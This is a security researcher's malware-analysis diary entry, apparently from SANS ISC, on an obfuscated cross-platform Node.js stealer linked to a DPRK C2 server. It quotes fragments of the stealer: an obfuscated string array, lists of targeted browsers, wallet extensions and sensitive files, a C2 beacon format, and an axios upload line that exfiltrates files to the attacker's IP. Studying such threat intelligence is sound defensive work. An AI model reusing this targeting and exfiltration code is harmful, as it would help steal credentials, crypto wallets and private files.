---
ai_commentary: []
ai_commentary_meta:
  content_digest: ''
  generated_at: ''
  model: ''
  prompt_version: ''
  provider: ''
category: ai-security
date: '2026-05-23T04:02:12.779885+00:00'
exported_at: '2026-05-23T04:02:14.982355+00:00'
feed: https://isc.sans.edu/rssfeed.xml
language: en
source_url: https://isc.sans.edu/diary/rss/33006
structured_data:
  about: []
  author: ''
  description: 'Cross-Platform NPM Stealer, Author: Xavier Mertens'
  headline: Cross-Platform NPM Stealer, (Fri, May 22nd)
  inLanguage: en
  keywords: []
  main_image: ''
  original_source: https://isc.sans.edu/diary/rss/33006
  publisher:
    logo: /favicon.ico
    name: GTCode
title: Cross-Platform NPM Stealer, (Fri, May 22nd)
updated_at: '2026-05-23T04:02:12.779885+00:00'
url_hash: 6099a63727b3003e313a6e2a8d84b0d6de95299c
---

I found a Node.js stealer that looked pretty well obfuscated. The file was not running out-of-the-box because it was uploaded on VT as “extracted-decoded.js” (and reformated). The SHA256 is 049300aa5dd774d6c984779a0570f59610399c71864b5d5c2605906db46ddeb9[
[1](https://www.virustotal.com/gui/file/049300aa5dd774d6c984779a0570f59610399c71864b5d5c2605906db46ddeb9)
]. It did not run properly in a sandbox so only a static analysis was performed.

The key point is that it is a cross-platform stealer targeting Windows (WSL), macOS and Linux. Good news for us, only the “wrapper” that is responsible for the execution is obfuscated but the malicious payloads are embedded in plain text! The obfuscation technique looks typical to the code produced by obfuscation.io[
[2](https://obfuscator.io)
]. We are facing a very long array of small Base64-encoded strings:

```
function c() {
  const t8 = ["W54gaGuj", "pSkByhzh", "WRT/WPThyG", "CSomW6OXWQG", "WO7dIuVcTaq", "AYb2Axm", "WPT3WPJdLmkS", "WPTNeuWa",
  "hCkIW64XW7C", "W47cM0tcObS", "WPKbWOKfW74", "W6JdNCkDWRe+", "W53dLuxcP3u", "WRTUc8ocW4W", "ysiSica", "wCo4oser", "tSkAW5v3ca",
  "W54XaKvz", "W7nTe8ooW7a", "W4BcSSo/FLi", "W6HvW7i+FG", "W5iBabul", "F8oQW4JcVCku", "W5ldPCkKbcy", "W6ddQcdcNq0", "Aw5Niha",
  "Dcy9W5dcVq", "C8o/eqBcHW", "id0GBMu", "W5FcISkyW4FcJG", "WR1ieSotW4y", "wSoqq8o1da", "B3jKvMe", "icDmB2m", "uSkgW4qZiq",
  "WO7cMSkoW7zX", "W5HxW6OnW7S", "W4SBWRHwW7e", "zwa3W5dcOG", "W4PCW79DW6a", "omkrngXB", "xmkVCWeJ", "nCoEWQ1WWR0", "WRNcH3vwCG",
  "W7lcTSoUCq8", "rM9sWR/cPW", "W4ZcKbxcUIC", "DgGGDg8", "WR7dK8kpWROP", "fmo7j1et", "id09psa", "vSo4Cx4n", "iIWImJq", "WRrixrpcJq",
  "u29JA2u", "ve9swsW", "WRBdHH3dUa0", "W5RcKLpdTuW", "u3ruyKK", "WOVcLSowW4RcPG", "BwuGzgK", "ugf0AdO", "W63cJ3Kmaa", "WPVdRCk1bti",
  "DwrVige", "C8k2WQxcTh0", "igvUDhi", "tmkSl1Ld", "qqvnW4pcMa", "WPNdGahdO0i", "nmkQWRNdPNa", "WQD8qmodW6G", "W4NdK8oBW5pdQq",
  "quFcOmoQWRe", "Cbyarmkq", "tmkoWQHU", "ewb8W4eF", "vcCOWOPc", "WRtdQc3dIrW", "WQXIrSoqW5q", "kcDqCM8", "imkUWQtcPxC",
  "bmooW7q6hW",
  ...
```

Other small functions are low-level decoders that perform a lot of arithmetic operations. There are three main payloads that all have their own purpose:

The first one is a browser credential stealer. It supports: Chrome, Brave, Edge, Opera, Opera GX, Vivaldi, Kiwi, Yandex, Iridium, Comodo Dragon, SRWare Iron, Chromium, AVG Browser.

```
const localAppDataBase = `/mnt/c/Users/${windowsUsername}/AppData/Local`;
const browserRelativePaths = [
  "Google/Chrome/User Data",                    // Chrome
  "BraveSoftware/Brave-Browser/User Data",      // Brave
  "AVG Browser/User Data",                      // AVG Browser
  "Microsoft/Edge/User Data",                   // Edge
  "Opera Software/Opera Stable",                // Opera
  "Opera Software/Opera GX",                    // Opera GX
  "Vivaldi/User Data",                          // Vivaldi
  "Kiwi Browser/User Data",                     // Kiwi
  "Yandex/YandexBrowser/User Data",             // Yandex
  "Iridium/User Data",                          // Iridium
  "Comodo/Dragon/User Data",                    // Comodo
  "SRWare Iron/User Data",                      // SRWare
  "Chromium/User Data"                          // Chromium\n
];
```

The malware also looks for interesting wallet Chrome extensions:

```
const wps = [
  "nkbihfbeogaeaoehlefnkodbefgpgknn",
  "ejbalbakoplchlghecdalmeeeajnimhm",
  "acmacodkjbdgmoleebolmdjonilkdbch",
  "bfnaelmomeimhlpmgjnjophhpkkoljpa",
  "ibnejdfjmmkpcnlpebklmnkoeoihofec",
  "egjidjbpglichdcondbcbdnbeeppgdph",
  "nphplpgoakhhjchkkhmiggakijnkhfnd",
  "omaabbefbmiijedngplfjmnooppbclkk",
  "bhhhlbepdkbapadjdnnojkbgioiodbic",
  "aeachknmefphepccionboohckonoeemg",
  "aflkmhkiijdbfcmhplgifokgdeclgpoi",
  "agoakfejjabomempkjlepdflaleeobhb",
  "aholpfdialjgjfhomihkjbmgjidlcdno",
  "afbcbjpbpfadlkmhmclhkeeodmamcflc",
  "cgbogdmdefihhljhfeffkljbghamglni",
  "dmkamcknogkgcdfhhbddcghachkejeap",
  "dlcobpjiigpikoobohmabehhmhfoodbb",
  "efbglgofoippbgcjepnhiblaibcnclgk",
  "ejjladinnckdgjemekebdpeokbikhfci",
  "fhbohimaelbohpjbbldcngcnapndodjp",
  "fhkbkphfeanlhnlffkpologfoccekhic",
  "fhmfendgdocmcbmfikdcogofphimnkno",
  "fldfpgipfncgndfolcbkdeeknbbbnhcc",
  "gjnckgkfmgmibbkoficdidcljeaaaheg",
  "hifafgmccdpekplomjjkcfgodnhcellj",
  "hmeobnfnfcmdkdcmlblgagmfpfboieaf",
  "hnfanknocfeofbddgcijnmhnfnkdnaad",
  "jiidiaalihmmhddjgbnbgdfflelocpak",
  "jblndlipeogpafnldhgmapagcccfchpi",
  "jmbkjchcobfffnmjboflnchcbljiljdk",
  "jnjpmcgfcfeffkfgcnjefkbkgcpnkpab",
  "kpkmkbkoifcfpapmleipncofdbjdpice",
  "khpkpbbcccdmmclmpigdgddabeilkdpd",
  "ldinpeekobnhjjdofggfgjlcehhmanaj",
  "lgmpcpglpngdoalbgeoldeajfclnhafa",
  "mcohilncbfahbmgdjkbpemcciiolgcge",
  "mopnmbcafieddcagagdcbnhejhlodfdd",
  "nkklfkfpelhghbidbnpdfhblphpfjmbo",
  "penjlddjkjgpnkllboccdgccekpkcbin",
  "ppbibelpcjmhbdihakflkdcoccbgbkpo"
]
```

Data is exfiltrated to port 8085.

The second one is a recursive file exfiltration scanner. It scans the victim’s filesystem and search for sensitive files by name/extension.

```
const SENSITIVE_FILE_PATTERNS = [
  ".keystore", "phone", "database","bank", "financ",".env","env","environment","config","configuration","configure",".conf",
  ".cfg",".ini",".properties",".yaml",".yml",".toml","metamask","phantom","bitcoin","ethereum","eth","trust",
  "wallet","coinbase","exodus","ledger","trezor","keystore","keyring","keychain","atomic","electrum","mycelium",
  "blockchain","bravewallet","rabby","coin98","backpack","core","mathwallet","solflare","glow","keplr","argent",
  "martian","petra","binance","okx","crypto","cryptocurrency","hardhat","truffle","private","privatekey", "private_key",
  "private-key","privkey","priv_key","key","keypair","key_pair","keypair",".pem",".p12",".pfx",".jks","keystore",".keys",
  "keys",".p8",".p7b",".p7c",".cer",".crt",".cert","cert",".der","id_rsa","id_dsa","id_ecdsa","id_ed25519",".pub",
  ".priv","seed","seedphrase","seed_phrase","seed-phrase","mnemonic","phrase","passphrase","pass_phrase",
  "pass-phrase","recovery","recoveryphrase","recovery_phrase","recovery-phrase","backup","backupphrase","backup_phrase",
  "backup-phrase","12words","12_words","12words","24words","24_words","24words","bip39","bip44","password","passwd","pass","pwd",
  "credential","credentials","auth","authentication","token","access_token","refresh_token","api_key","apikey","api-key",
  "apisecret","api_secret","api-secret","secret","secrets","secretkey","secret_key","secret-key","masterkey","master_key",
  "master-key","masterpassword","master_password","master-password","account","accounts","profile","profiles","user",
  "username","user_name","user-name","login","signin","sign_in","sign-in","address","addresses","tx","transaction","transactions",
  ".db",".sqlite",".sqlite3",".sql",".mdb",".accdb",".dbf",".doc",".docx",".pdf",".md",".markdown",".rtf",".odt",
  ".xls",".xlsx",".txt","text","note","notes","memo","memos","screenshot","screen","snapshot","capture",".png",".jpg",
  ".jpeg",".bmp",".json",".js",".ts",".jsx",".tsx",".csv",".xml",".lock",".log",".bak","backup",".old",".orig",".save",
?????  ".swp",".tmp","tmp","my","personal","vault","safe","secure","lock","encrypt","decrypt","signature","sign","certificate",
  "cert","identity","session","cookie"
];
```

Interesting files are exfiltrated via port 8086.

Finally, the third module implements a WebSocket connection to the C2 server (port 8087) with reverse-shell capabilities. Upon the first connection the following info is sent to the C2 via a POST reques to hxxp://216[.]126[.]225[.]243:8087/api/notify

```
{
  "ukey": 504,
  "t": 5,
  "host": "504_&lt;hostname&gt;",
  "os": "&lt;type&gt; &lt;release&gt;",
  "username": "&lt;username&gt;",
  "timestamp":&lt;unix_ts&gt;
}
```

All communications (on different ports) are made with the IP address
[216.126.225.243](/ipinfo.html?ip=216.126.225.243)
. This IP address is known as a DPRK OtterCookie C2[
[3](https://socket.dev/blog/north-korea-contagious-interview-npm-attacks)
]. Note that if the execution module is pretty well obfuscated, the key used to encrypt data is available in plain text:

```
const X = crypto.createHmac("sha256", "SuperStr0ngSecret@)@^").update(l).digest("hex");
```

Also, all HTTP communications are performed via the Axios[
[4](https://github.com/axios/axios)
] NPM package:

```
const response = await axios.post(`" + "hxxp://216[.]126[.]225[.]243:8086/upload" + "`, form, { ...
```

[1]
&lt;https://www.virustotal.com/gui/file/049300aa5dd774d6c984779a0570f59610399c71864b5d5c2605906db46ddeb9&gt;

[2]
&lt;https://obfuscator.io&gt;

[3]
&lt;https://socket.dev/blog/north-korea-contagious-interview-npm-attacks&gt;

[4]
&lt;https://github.com/axios/axios&gt;

Xavier Mertens (@xme)

Xameco

Senior ISC Handler - Freelance Cyber Security Consultant

[PGP Key](https://keybase.io/xme/key.asc)